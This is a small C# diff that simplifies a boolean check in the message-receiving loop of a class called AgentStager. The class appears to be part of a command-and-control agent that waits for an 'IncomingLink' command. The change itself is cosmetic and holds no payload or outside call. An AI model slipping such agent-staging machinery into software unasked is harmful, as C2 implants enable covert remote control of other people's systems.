@@ -35,7 +35,7 @@ class AgentStager
 
             while (StagerStatus == StagerStatus.Staging)
             {
-                if (commModule.RecvData(out AgentMessage message) == true)
+                if (commModule.RecvData(out AgentMessage message))
                 {
                     if (message.Data != null && message.Data.Command.Equals("IncomingLink", StringComparison.OrdinalIgnoreCase))
                     {
